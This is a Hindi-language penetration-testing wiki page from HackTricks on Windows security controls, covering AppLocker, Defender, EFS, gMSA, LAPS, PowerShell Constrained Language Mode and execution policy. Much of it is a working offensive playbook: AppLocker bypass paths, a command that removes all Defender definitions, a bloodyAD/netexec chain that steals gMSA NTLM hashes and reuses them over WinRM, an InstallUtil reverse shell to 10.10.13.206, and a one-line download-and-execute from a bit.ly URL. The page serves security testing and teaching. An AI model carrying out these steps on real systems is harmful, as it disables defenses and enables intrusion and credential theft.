# Windows सुरक्षा नियंत्रण

{{#include ../../banners/hacktricks-training.md}}

## AppLocker नीति

एक एप्लिकेशन व्हाइटलिस्ट उन अनुमोदित सॉफ़्टवेयर एप्लिकेशन या executable फाइलों की सूची है जिन्हें किसी सिस्टम पर मौजूद रहने और चलने की अनुमति होती है। इसका उद्देश्य संगठन की विशिष्ट व्यावसायिक आवश्यकताओं के अनुरूप न होने वाले हानिकारक malware और अनअनुमोदित सॉफ़्टवेयर से पर्यावरण की सुरक्षा करना है।

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft का **application whitelisting solution** है और सिस्टम एडमिनिस्ट्रेटरों को यह नियंत्रण देता है कि **किसे applications और files को users चला सकते हैं**। यह **सूक्ष्म नियंत्रण** प्रदान करता है executables, scripts, Windows installer files, DLLs, packaged apps, और packed app installers पर।\
संगठनों के लिए आम है कि वे **cmd.exe और PowerShell.exe को ब्लॉक** कर दें और कुछ डायरेक्टरीज़ पर write access रोक दें, **पर इसे सभी बायपास किया जा सकता है**।

### जाँच

पता करें कि कौन सी फाइलें/एक्सटेंशन्स ब्लैकलिस्टेड/व्हाइटलिस्टेड हैं:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
यह रजिस्ट्री पाथ AppLocker द्वारा लागू की गई कॉन्फ़िगरेशन और नीतियों को रखता है, जिससे सिस्टम पर लागू वर्तमान नियमों के सेट की समीक्षा करने का एक तरीका मिलता है:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### बायपास

- AppLocker नीति को बायपास करने के लिए उपयोगी **लिखने योग्य फ़ोल्डर**: यदि AppLocker `C:\Windows\System32` या `C:\Windows` के अंदर किसी भी चीज़ को निष्पादित करने की अनुमति दे रहा है तो ऐसे **लिखने योग्य फ़ोल्डर** हैं जिनका आप उपयोग करके **इसे बायपास कर सकते हैं**।
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- आम तौर पर **भरोसेमंद** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries AppLocker को बायपास करने में भी उपयोगी हो सकती हैं।
- **खराब तरीके से लिखे गए नियमों को भी बायपास किया जा सकता है**
- उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, आप कहीं भी **`allowed` नाम का एक फ़ोल्डर** बना सकते हैं और उसे अनुमति मिल जाएगी।
- संगठन अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable** को ब्लॉक करने पर ध्यान देते हैं, लेकिन अन्य [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe` को भूल जाते हैं।
- सिस्टम पर अतिरिक्त लोड और आवश्यक परीक्षण की मात्रा के कारण **DLL enforcement बहुत कम ही सक्षम किया जाता है**। इसलिए **DLLs को backdoors के रूप में उपयोग करना AppLocker को बायपास करने में मदद करेगा**।
- आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग किसी भी प्रक्रिया में **Powershell** कोड execute करने और AppLocker को बायपास करने के लिए कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## Credentials Storage

### Security Accounts Manager (SAM)

स्थानीय क्रेडेंशियल्स इस फ़ाइल में मौजूद होते हैं, पासवर्ड हैश किए जाते हैं।

### Local Security Authority (LSA) - LSASS

Single Sign-On कारणों से ये **credentials** (hashed) इस सबसिस्टम की **memory** में **सहेजे** जाते हैं।\
**LSA** स्थानीय **security policy** (पासवर्ड पॉलिसी, उपयोगकर्ता अनुमतियाँ...), **authentication**, **access tokens** आदि का प्रबंधन करता है।\
LSA वही घटक होगा जो स्थानीय लॉगिन के लिए **SAM** फ़ाइल के अंदर प्रदत्त क्रेडेंशियल्स की **जांच** करेगा और डोमेन उपयोगकर्ता को प्रमाणित करने के लिए **domain controller** से **बात** करेगा।

ये **credentials** प्रक्रिया LSASS के अंदर सहेजे जाते हैं: Kerberos tickets, NT और LM हैशेस, आसानी से डीक्रिप्ट किए जा सकने वाले पासवर्ड।

### LSA secrets

LSA डिस्क पर कुछ क्रेडेंशियल्स सहेज सकता है:

- Active Directory के कंप्यूटर अकाउंट का पासवर्ड (यदि domain controller पहुँच योग्य न हो)।
- Windows सेवाओं के खातों के पासवर्ड
- शेड्यूल्ड टास्क्स के लिए पासवर्ड
- और भी (IIS applications का पासवर्ड...)

### NTDS.dit

यह Active Directory का डेटाबेस है। यह केवल Domain Controllers पर मौजूद होता है।

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) एक Antivirus है जो Windows 10 और Windows 11 तथा Windows Server के संस्करणों में उपलब्ध है। यह सामान्य pentesting टूल्स जैसे **`WinPEAS`** को **ब्लॉक** करता है। हालांकि, इन सुरक्षा उपायों को **बायपास** करने के तरीके मौजूद हैं।

### Check

Defender की **स्थिति** जांचने के लिए आप PS cmdlet **`Get-MpComputerStatus`** चला सकते हैं (जानने के लिए कि यह सक्रिय है या नहीं, **`RealTimeProtectionEnabled`** के मान की जांच करें):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

इसे एनेमरेट करने के लिए आप निम्न भी चला सकते हैं:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## एन्क्रिप्टेड फ़ाइल सिस्टम (EFS)

EFS फ़ाइलों को एन्क्रिप्शन के माध्यम से सुरक्षित करता है, एक **symmetric key** जिसका नाम **File Encryption Key (FEK)** है, का उपयोग करके। यह कुंजी उपयोगकर्ता की **public key** से एन्क्रिप्ट की जाती है और एन्क्रिप्ट की गई फ़ाइल के $EFS **alternative data stream** में संग्रहित रहती है। जब डिक्रिप्शन की आवश्यकता होती है, तो उपयोगकर्ता के डिजिटल सर्टिफिकेट की संबंधित **private key** का उपयोग $EFS stream से FEK को डिक्रिप्ट करने के लिए किया जाता है। More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Decryption scenarios without user initiation** include:

- जब फ़ाइलें या फ़ोल्डर non-EFS file system, जैसे [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), पर स्थानांतरित किए जाते हैं तो उन्हें स्वचालित रूप से डिक्रिप्ट कर दिया जाता है।
- SMB/CIFS protocol के माध्यम से नेटवर्क पर भेजी जाने वाली एन्क्रिप्ट की गई फ़ाइलें प्रसारण से पहले डिक्रिप्ट कर दी जाती हैं।

यह एन्क्रिप्शन तरीका मालिक को एन्क्रिप्ट की गई फ़ाइलों के लिए **transparent access** प्रदान करता है। हालांकि, केवल मालिक का पासवर्ड बदलने और लॉगिन करने से डिक्रिप्शन संभव नहीं होगा।

**Key Takeaways**:

- EFS एक symmetric FEK का उपयोग करता है, जो उपयोगकर्ता की public key से एन्क्रिप्ट किया जाता है।
- डिक्रिप्शन के लिए उपयोगकर्ता की private key का उपयोग FEK तक पहुँचने के लिए किया जाता है।
- स्वचालित डिक्रिप्शन कुछ विशिष्ट परिस्थितियों में होता है, जैसे FAT32 पर कॉपी करना या नेटवर्क के माध्यम से ट्रांसमिशन।
- एन्क्रिप्ट की गई फ़ाइलें मालिक द्वारा अतिरिक्त कदम के बिना एक्सेस की जा सकती हैं।

### EFS जानकारी जाँचें

जाँच करें कि कोई **user** ने इस **service** को **used** किया है या नहीं — यह देखने के लिए कि यह path मौजूद है:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

फ़ाइल पर किसे **access** है यह जाँचने के लिए cipher /c \<file\> का उपयोग करें\
आप किसी फ़ोल्डर के अंदर `cipher /e` और `cipher /d` का उपयोग करके सभी फ़ाइलों को **encrypt** और **decrypt** कर सकते हैं

### EFS फ़ाइलों को डिक्रिप्ट करना

#### Being Authority System

यह तरीका यह माँगता है कि **victim user** होस्ट के अंदर एक **process** चला रहा हो। यदि ऐसा है, तो `meterpreter` sessions का उपयोग करके आप उपयोगकर्ता के process के token की impersonation कर सकते हैं (`impersonate_token` from `incognito`). या आप बस उपयोगकर्ता के process में `migrate` कर सकते हैं।

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## समूह प्रबंधित सेवा खाते (gMSA)

Microsoft ने IT इन्फ्रास्ट्रक्चर में service accounts के प्रबंधन को सरल बनाने के लिए **Group Managed Service Accounts (gMSA)** विकसित किए। पारंपरिक service accounts के विपरीत जिनमें अक्सर 'Password never expire' सेटिंग सक्षम होती है, gMSAs अधिक सुरक्षित और प्रबंधनीय समाधान प्रदान करते हैं:

- **Automatic Password Management**: gMSAs एक जटिल, 240-character password का उपयोग करते हैं जो domain या computer policy के अनुसार स्वचालित रूप से बदलता रहता है। यह प्रक्रिया Microsoft's Key Distribution Service (KDC) द्वारा संभाली जाती है, जिससे मैन्युअल पासवर्ड अपडेट की आवश्यकता खत्म हो जाती है।
- **Enhanced Security**: ये खाते lockouts के प्रति immune होते हैं और interactive logins के लिए उपयोग नहीं किए जा सकते, जिससे उनकी सुरक्षा बढ़ती है।
- **Multiple Host Support**: gMSAs कई hosts पर साझा किए जा सकते हैं, जिससे वे कई सर्वरों पर चलने वाली सेवाओं के लिए उपयुक्त होते हैं।
- **Scheduled Task Capability**: managed service accounts के विपरीत, gMSAs scheduled tasks चलाने का समर्थन करते हैं।
- **Simplified SPN Management**: जब कंप्यूटर के sAMaccount विवरण या DNS नाम में परिवर्तन होता है, तो सिस्टम स्वचालित रूप से Service Principal Name (SPN) को अपडेट करता है, जिससे SPN प्रबंधन सरल हो जाता है।

gMSA के पासवर्ड LDAP property _**msDS-ManagedPassword**_ में संग्रहीत होते हैं और Domain Controllers (DCs) द्वारा प्रत्येक 30 दिनों में स्वचालित रूप से रीसेट किए जाते हैं। यह पासवर्ड, एक एन्क्रिप्टेड डेटा ब्लॉब जिसे [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) कहा जाता है, केवल अधिकृत administrators और उन सर्वरों द्वारा ही पुनःप्राप्त किया जा सकता है जिन पर gMSAs इंस्टॉल हैं, जिससे एक सुरक्षित वातावरण सुनिश्चित होता है। इस जानकारी तक पहुँचने के लिए, LDAPS जैसी एक सुरक्षित कनेक्शन आवश्यक है, या कनेक्शन को 'Sealing & Secure' के साथ प्रमाणित किया जाना चाहिए।

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

आप इस पासवर्ड को पढ़ने के लिए [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) का उपयोग कर सकते हैं:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

इसके अलावा, इस [web page](https://cube0x0.github.io/Relaying-for-gMSA/) को देखें जो बताती है कि कैसे **NTLM relay attack** करके **gMSA** का **password** पढ़ा जा सकता है।

### ACL chaining का दुरुपयोग करके gMSA प्रबंधित पासवर्ड पढ़ना (GenericAll -> ReadGMSAPassword)

कई वातावरणों में, कम-प्रिविलेज उपयोगकर्ता misconfigured object ACLs का दुरुपयोग करके DC compromise किए बिना gMSA secrets तक पहुंच बना सकते हैं:

- एक ऐसा group जिसे आप नियंत्रित कर सकते हैं (उदाहरण के लिए, GenericAll/GenericWrite के माध्यम से) को gMSA पर `ReadGMSAPassword` दिया गया है।
- अपने आप को उस group में जोड़कर, आप LDAP के माध्यम से gMSA का `msDS-ManagedPassword` blob पढ़ने का अधिकार विरासत में पाते हैं और उपयोगी NTLM credentials निकाल सकते हैं।

सामान्य कार्यप्रवाह:

1) BloodHound के साथ path ढूंढें और अपने foothold principals को Owned के रूप में चिह्नित करें। निम्नलिखित तरह के edges देखें:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) जिस intermediate group को आप नियंत्रित करते हैं उसमें स्वयं को जोड़ें (उदाहरण bloodyAD के साथ):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP के माध्यम से gMSA मैनेज्ड पासवर्ड पढ़ें और NTLM हैश प्राप्त करें। NetExec `msDS-ManagedPassword` का निष्कर्षण और NTLM में रूपांतरण स्वचालित करता है:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) gMSA के रूप में NTLM hash का उपयोग करके Authenticate करें (कोई plaintext आवश्यक नहीं)। यदि खाता Remote Management Users में है, तो WinRM सीधे काम करेगा:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
नोट:
- `msDS-ManagedPassword` की LDAP रीड्स के लिए sealing की आवश्यकता होती है (उदा., LDAPS/sign+seal)। टूल्स इसे स्वचालित रूप से संभाल लेते हैं।
- gMSAs को अक्सर WinRM जैसे लोकल अधिकार दिए जाते हैं; lateral movement की योजना बनाने के लिए group membership (उदा., Remote Management Users) सत्यापित करें।
- यदि आपको सिर्फ blob की आवश्यकता है ताकि आप स्वयं NTLM की गणना कर सकें, तो MSDS-MANAGEDPASSWORD_BLOB structure देखें。



## LAPS

The **Local Administrator Password Solution (LAPS)**, जिसे [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) से डाउनलोड किया जा सकता है, स्थानीय Administrator पासवर्ड्स के प्रबंधन की सुविधा देता है। ये पासवर्ड्स, जो **randomized**, unique, और **regularly changed** होते हैं, केंद्रीय रूप से Active Directory में संग्रहीत होते हैं। इन पासवर्ड्स तक पहुँच ACLs के माध्यम से अधिकृत उपयोगकर्ताओं तक सीमित रहती है। पर्याप्त अनुमतियाँ दिए जाने पर स्थानीय admin पासवर्ड पढ़ने की क्षमता प्राप्त हो जाती है।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **कई उन सुविधाओं को लॉक कर देता है** जो PowerShell को प्रभावी ढंग से उपयोग करने के लिए आवश्यक हैं, जैसे कि COM objects को ब्लॉक करना, केवल अनुमोदित .NET types की अनुमति देना, XAML-आधारित workflows, PowerShell classes, और अन्य।

### **जांचें**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
वर्तमान Windows में वह Bypass काम नहीं करेगा लेकिन आप[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**इसे कंपाइल करने के लिए आपको संभवतः आवश्यकता हो सकती है** **करने के लिए** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **प्रोजेक्ट को .Net4.5 में बदलें**।

#### सीधा bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग किसी भी process में **execute Powershell** code करने और constrained mode को bypass करने के लिए कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS Execution नीति

डिफ़ॉल्ट रूप से यह **restricted.** पर सेट होता है। इस नीति को bypass करने के मुख्य तरीके:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [यहाँ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

यह API है जिसे users को authenticate करने के लिए उपयोग किया जा सकता है।

SSPI उन दोनों मशीनों के लिए उपयुक्त प्रोटोकॉल खोजने के लिए जिम्मेदार होगा जो संवाद करना चाहती हैं। इस के लिए पसंदीदा विधि Kerberos है। फिर SSPI यह बातचीत करेगा कि कौन सा authentication protocol उपयोग किया जाएगा, इन authentication protocols को Security Support Provider (SSP) कहा जाता है, ये प्रत्येक Windows मशीन के अंदर DLL के रूप में स्थित होते हैं और दोनों मशीनों को संवाद करने में सक्षम होने के लिए एक ही का समर्थन करना चाहिए।

### मुख्य SSPs

- **Kerberos**: पसंदीदा तरीका
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** और **NTLMv2**: Compatibility कारणों से
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers और LDAP के लिए, password MD5 hash के रूप में
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL और TLS के लिए
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: यह उपयोग किए जाने वाले प्रोटोकॉल (Kerberos या NTLM, जहाँ Kerberos default है) को negotiate करने के लिए उपयोग होता है
- %windir%\Windows\System32\lsasrv.dll

#### बातचीत कई तरीकों की पेशकश कर सकती है या केवल एक।

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक feature है जो elevated गतिविधियों के लिए एक consent prompt सक्षम करता है।


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
